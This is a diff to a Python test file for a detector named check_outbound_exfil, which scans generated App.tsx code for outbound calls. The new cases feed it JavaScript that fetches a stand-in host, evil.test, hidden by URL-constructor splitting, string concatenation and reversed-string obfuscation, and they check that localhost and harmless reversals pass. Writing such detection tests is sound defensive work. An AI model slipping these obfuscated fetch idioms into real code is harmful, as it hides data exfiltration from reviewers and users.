@@ -534,6 +534,96 @@ def test_atob_invalid_base64_passes():
     assert check_outbound_exfil(content, "App.tsx") is None
 
 
+# --- QA-3 Fire 114 variant (c): new URL constructor ------------------------
+
+
+def test_new_url_constructor_two_arg_blocks():
+    content = (
+        'const u = new URL("/path", "https://evil.test");\n'
+        'fetch(u.href);\n'
+    )
+    err = check_outbound_exfil(content, "App.tsx")
+    assert err is not None
+    assert "evil.test" in err
+
+
+def test_new_url_constructor_inline_blocks():
+    content = 'fetch(new URL("/x", "https://evil.test").href);'
+    err = check_outbound_exfil(content, "App.tsx")
+    assert err is not None
+
+
+def test_new_url_constructor_single_arg_blocks():
+    content = 'const u = new URL("https://evil.test/x"); fetch(u);'
+    err = check_outbound_exfil(content, "App.tsx")
+    assert err is not None
+
+
+def test_new_url_constructor_with_concat_blocks():
+    """Constructor second arg split across `"http" + "s://..."` — fold first."""
+    content = (
+        'const u = new URL("/path", "http" + "s://evil.test/");\n'
+        'fetch(u);\n'
+    )
+    err = check_outbound_exfil(content, "App.tsx")
+    assert err is not None
+
+
+def test_new_url_localhost_passes():
+    assert check_outbound_exfil(
+        'const u = new URL("/path", "http://localhost:3000"); fetch(u);',
+        "App.tsx",
+    ) is None
+    assert check_outbound_exfil(
+        'const u = new URL("https://localhost:3000/x"); fetch(u);',
+        "App.tsx",
+    ) is None
+
+
+# --- QA-3 Fire 114 variant (d): reverse-string obfuscation ------------------
+
+
+def test_reverse_string_literal_blocks():
+    """`"REVERSED".split("").reverse().join("")` — canonical reverse idiom."""
+    # "tset.live//:sptth" reversed → "https://evil.test"
+    content = (
+        'const rev = "tset.live//:sptth".split("").reverse().join("");\n'
+        'fetch(rev);\n'
+    )
+    err = check_outbound_exfil(content, "App.tsx")
+    assert err is not None
+    assert "evil.test" in err
+
+
+def test_reverse_string_via_decl_blocks():
+    content = (
+        'const s = "tset.live//:sptth";\n'
+        'const url = s.split("").reverse().join("");\n'
+        'fetch(url);\n'
+    )
+    err = check_outbound_exfil(content, "App.tsx")
+    assert err is not None
+
+
+def test_reverse_non_url_passes():
+    """Legit: reversing a non-URL string (e.g. greeting) must not block."""
+    content = (
+        'const greeting = "olleh".split("").reverse().join("");\n'
+        'return <p>{greeting}</p>;\n'
+    )
+    assert check_outbound_exfil(content, "App.tsx") is None
+
+
+def test_reverse_decl_without_reverse_call_passes():
+    """Declaring a string that happens to reverse-to-a-URL is fine if the
+    reverse idiom is never invoked."""
+    content = (
+        'const backwards = "tset.live//:sptth";\n'
+        'console.log(backwards);\n'
+    )
+    assert check_outbound_exfil(content, "App.tsx") is None
+
+
 def test_filewrite_clean_counter_passes():
     """Sanity: a benign counter still writes fine."""
     with tempfile.TemporaryDirectory() as tmp:
